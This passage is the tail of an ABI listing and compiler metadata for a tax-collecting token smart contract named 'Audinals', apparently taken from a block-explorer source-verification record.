r\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_collector\",\"type\":\"address\"}],\"name\":\"setTaxCollector\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxCollector\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxSplit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingActiveTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_wallets\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_enabled\",\"type\":\"uint256\"}],\"name\":\"transferProtection\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_split\",\"type\":\"uint256\"}],\"name\":\"updateSplit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"updateSwapTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletProtection\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Audinals", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6ebc6892a77bd93811c49f802d8bddfa0c8cce0d9ec437eebaece2340769631a"}